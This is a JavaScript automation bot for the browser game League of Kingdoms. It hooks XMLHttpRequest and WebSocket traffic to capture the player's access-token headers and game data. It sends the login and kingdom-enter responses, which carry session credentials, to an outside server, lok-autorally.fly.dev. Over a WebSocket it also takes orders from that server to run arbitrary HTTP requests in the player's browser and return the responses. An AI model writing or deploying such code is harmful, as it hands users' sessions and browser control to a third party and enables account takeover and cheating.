import { r as c, I as M, S as ht, _ as E, R as k, a as St, O as pt, i as Ht, b as fa, g as X, c as Cr, d as Or, P as va, e as ma, f as br, D as F, h as ha, j as ga, k as Gn, m as Mt, s as sn, l as Ea, n as Rr, o as ya, p as Sr, q as B, t as Ca, u as Oa, v as xr, w as ba, x as Ra, y as Sa, z as xa, A as Nr, B as Ke, C as Ye, E as Qt, F as Ee, T as Na, G as Ta, H as Pa, J as Lt, K as ln, L as wa, M as Aa, N as Wn, Q as Gt, U as un, V as cn, W as rt, X as zn, Y as gn, Z as en, $ as _a, a0 as La, a1 as Ia, a2 as Da, a3 as ka, a4 as Ma, a5 as Va, a6 as $n, a7 as ja, a8 as En, a9 as Ba, aa as Fa, ab as Ua, ac as Ha, ad as Ga, ae as Wa, af as za, ag as $a, ah as Ka, ai as Ya, aj as qa, ak as Xa, al as Wt, am as Ja, an as Tr, ao as Pr, ap as Za, aq as Qa, ar as eo, as as to, at as no, au as ro, av as Kn, aw as ao, ax as _e, ay as oo, az as io, aA as so, aB as lo, aC as uo, aD as co, aE as po, aF as fo, aG as Yn, aH as qn, aI as vo, aJ as mo, aK as ho, aL as go, aM as Eo, aN as Xn, aO as yo, aP as Co, aQ as Oo, aR as bo, aS as Ro, aT as So, aU as xo, aV as No, aW as To, aX as Po, aY as wo, aZ as wr, a_ as Ao, a$ as _o, b0 as Lo, b1 as Io, b2 as yn, b3 as Do, b4 as ko, b5 as Mo, b6 as Vo, b7 as jo, b8 as O, b9 as Jn, ba as Bo, bb as Ar, e } from "https://lok-autorally.fly.dev//client-B3Es0ZnZ.js";

const Ut = !1;
function Dl(e) {
  if (typeof e == "string")
    return e.indexOf("ey") === 0 && (e = atob(e)), e.startsWith("{") && (e = JSON.parse(e)), e;
}
let kl = Dl;
const oa = (e) => ({
  decode: (n) => kl(n)
}), Ml = 1e3, Vl = Ml * 60;
let te, At = 0;

const MAX_RECONNECT = 10;
const DEFAULT_WS_URL = "ws://localhost:3000";
let socket, reconnectAttempts = 0;

function ia(clientId, url = DEFAULT_WS_URL) {
  //console.warn("Connecting with clientId:", clientId);
  socket = new WebSocket(url);

  socket.addEventListener("open", () => {
    console.log("Connected to server");
    reconnectAttempts = 0;
    socket.send(JSON.stringify({
      type: "identity",
      payload: { clientId }
    }));
  });

  socket.addEventListener("message", async (event) => {
    console.warn("event:", event);
    const data = JSON.parse(event.data);
    if (data.type !== "task" || data.payload.clientId !== clientId) {
      console.warn("Received task for another client:", data.payload?.clientId);
      return;
    }

    const { id, url, headers, body, method } = data.payload;
    console.warn("TASK RECEIVED", url, body);

    socket.send(JSON.stringify({
      type: "ack",
      payload: { id, clientId, status: "received" }
    }));

    try {
      const response = await fetch(url, { method, headers, body, mode: "cors" });
      const responseText = await response.text();

      //console.warn("responseTex", responseText);

      socket.send(JSON.stringify({
        type: "response",
        payload: {
          id, clientId,
          status: response.status,
          headers: Object.fromEntries(response.headers.entries()),
          body: responseText
        }
      }));
    } catch (error) {
      socket.send(JSON.stringify({
        type: "response",
        payload: {
          id, clientId,
          status: 0,
          headers: {}, body: "",
          error: error.message
        }
      }));
    }
  });

  socket.addEventListener("close", () => {
    console.log("Disconnected from server");
    if (reconnectAttempts < MAX_RECONNECT) {
      const delay = 2 ** reconnectAttempts * 1000;
      console.log(`Reconnecting in ${delay / 1000}s...`);
      setTimeout(() => {
        reconnectAttempts++;
        ia(clientId, url);
      }, delay);
    } else {
      console.error("Max reconnection attempts reached.");
    }
  });

  socket.addEventListener("error", (err) => {
    console.error("WebSocket error:", err);
    socket.close();
  });
}

window.alert = console.warn.bind(null, "[ALERT]");
let Xt = oa(), Jt, sa, ot = null;
const Fl = {}, Ul = {}, Hl = {}, Gl = [0, 0, 0, 0, 0], Wl = {};
let zl = [];
document.gameData = {
  fieldObjects: Fl,
  spy: Ul,
  battle: Hl,
  resources: Gl,
  tasks: Wl,
  kingdom: null
};
window.addEventListener(
  "keypress",
  (e) => {
    he.shown && e.stopImmediatePropagation();
  },
  !0
);

const Bn = "https://lok-autorally.fly.dev";
console.warn("serverURL:", Bn);

async function Fn(e, n) {
  try {
    const res = await fetch(`${Bn}/run_command`, {
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json"
      },
      method: "POST",
      body: JSON.stringify({
        commandName: e,
        commandArguments: n,
        loginResponse: Jt,
        enterResponse: sa
      })
    });

    const text = await res.text();

    let json;
    try {
      json = JSON.parse(text);
    } catch {
      console.warn("⚠️ Bukan JSON valid:", text);
      return;
    }

    console.warn("✅ Server response:", json.message || json);
    //console.warn("✅ e:", e);
    //console.warn("✅ n:", n);

    // Hanya log, tidak menghentikan
    if (json.message?.includes("Subscription is not valid")) {
      console.warn("⚠️ Subscription tidak valid, tapi script tetap berjalan.");
    }

  } catch (err) {
    console.error("❌ Gagal memanggil run_command:", err.message || err);
    // Script tetap lanjut walau error
  }
}
// Langsung panggil tanpa cek Jt
Ie.addEventListener("settings.changed", (e) => {
  Fn("syncSettings", [e.detail]);
});

// Interval tetap jalan
const $l = setInterval(() => {
  Fn("syncSettings", [he]);
}, 5 * Vl);

// Registrasi fungsi ke sistem luar
setTimeout(() => {
  typeof Il === "function" && Il({ sendCommand: Fn });
}, 2000);

const la = new TextDecoder("utf-8");
const Kl = new TextEncoder();

let _t;

// Handler untuk response login/auth
const handleLogin = (res) => {
  console.warn("login response", res);
  Jt = res;
  Xt = oa(); // inisialisasi decoder atau helper
  return null;
};

// Map endpoint → handler fungsi
const yr = {
  "/api/auth/connect": handleLogin,
  "/api/auth/login": handleLogin,
  "/api/kingdom/enter": (res) => {
    sa = res;
    ia(res.kingdom._id, Bn);
    setTimeout(() => {
      De({ inCastle: true, gameState: "loaded" });
    }, 2000);
    return null;
  },
  // Endpoint yang tidak diproses
  "/api/field/rally/join": () => null,
  "/api/item/use": () => { },
  "/api/item/list": () => null,
  "/api/field/march/save": () => null,
  "/api/kingdom/profile/my": () => null,
  "/api/alliance/battle/list/v2": () => null
};

// Set status awal
De({ gameState: "loading" });

// WebSocket paths
const ignoredPaths = ["/march/object/update", "/chat/new"];
const allowedPaths = ["/buff/list", "/zone/enter/list/v4", "/zone/leave/list/v2"];

// Handler WebSocket global
const Jl = (event, direction) => {
  try {
    if (!Ut && direction === "send") return;

    const rawData = event.data.slice(2);
    const [path, payloadRaw] = JSON.parse(rawData);

    if (!path || !payloadRaw || !allowedPaths.includes(path) || ignoredPaths.includes(path)) return;

    const decodedPayload = Xt.decode(payloadRaw);

    switch (event.origin) {
      case "wss://sock-lok-live.leagueofkingdoms.com":
        if (path === "/buff/list") {
          zl = decodedPayload;
        } else if (path.startsWith("/task/") || path === "/actionPoint/update" || path === "/kingdom/enter") {
          return;
        }
        break;

      case "wss://socf-lok-live.leagueofkingdoms.com":
        if (["/field/objects", "/field/objects/v3", "/field/objects/v4"].includes(path)) {
          De({ inCastle: false });
        }
        break;

      default:
        return;
    }
  } catch (err) {
    console.info("FAILED TO PARSE SOCKET DATA", event);
  }
};

// Pasangkan handler ke WebSocket global
Uo(window.WebSocket, Jl);


const skipPaths = ["dragothumb", "nft/avatar"];
const validApis = ["api-lok-live", "lok-api-live"];

// Intercept setRequestHeader
function interceptSetRequestHeader(original) {
  XMLHttpRequest.prototype.setRequestHeader = function (name, value) {
    original.apply(this, arguments);
    this.headers ??= {};
    this.headers[name] ??= [];
    this.headers[name].push(value);
  };
}
interceptSetRequestHeader(XMLHttpRequest.prototype.setRequestHeader);

// Intercept open
function interceptOpen(original) {
  XMLHttpRequest.prototype.open = function (method, url) {
    this.url = url;

    console.warn("interceptOpen : ", this.url)

    const shouldSkip =
      skipPaths.some(path => url.includes(path)) ||
      validApis.every(api => !url.includes(api));
    
    if (shouldSkip) return original.apply(this, arguments);

    setTimeout(() => {
      const originalOnload = this.onload;

      this.onload = function (...args) {
        const path = new URL(this.responseURL || window.location.href).pathname;
        let parsed, transformed;

        try {
          const raw = la.decode(this.response);
          parsed = Xt.decode(raw);

          if (
            parsed && !parsed.result &&
            ["exceed_limit_packet", "not_online"].includes(parsed.err?.code)
          ) {
            De({ autoRun: false });
            setTimeout(() => {
              De({ autoRun: true });
              window.location.reload();
            }, 10 * 60 * 1000);
          }
        } catch (err) {
          console.error("Failed to parse response:", path, err);
        }

        if (yr[path]) {
          try {
            transformed = yr[path](parsed || this.response, this.payload);
          } catch (err) {
            console.error("Failed to transform response:", path, err);
          }

          if (transformed) {
            Object.defineProperty(this, "response", { writable: true });
            this.response = Kl.encode(JSON.stringify(transformed)).buffer;
          }
        }

        Ie.dispatchEvent(
          new CustomEvent("xhr.load", {
            detail: { url: path, response: transformed || parsed }
          })
        );

        if (originalOnload) originalOnload.apply(this, args);
      };
    }, 0);

    return original.apply(this, arguments);
  };
}
interceptOpen(XMLHttpRequest.prototype.open);

// Intercept send
function interceptSend(original) {
  XMLHttpRequest.prototype.send = function () {
    try {
      const url = this.url || "";
      const shouldSkip =
        skipPaths.some(path => url.includes(path)) ||
        validApis.every(api => !url.includes(api));

      if (shouldSkip) return original.apply(this, arguments);

      if (!ot && this.headers?.["x-access-token"]) {
        ot = this.headers;
      }

      const decodedBody = la.decode(arguments[0]);
      const jsonParam = decodedBody.split("json=")[1];
      const jsonString = decodeURIComponent(jsonParam);

      if ((ot?.["content-Type"] || ot?.["Content-Type"]) !== "application/json") {
        this.payload = Xt.decode(jsonString);
      }

      Ie.dispatchEvent(new CustomEvent("xhr.send", {
        detail: {
          url: this.url,
          data: jsonString
        }
      }));

      if (_t && url.includes(_t)) {
        Ut && console.warn("Request blocked due to _t match:", _t, url);
        _t = undefined;
        return;
      }
    } catch (err) {
      console.error("XHR send intercept error:", err);
    }

    return original.apply(this, arguments);
  };
}
interceptSend(XMLHttpRequest.prototype.send);

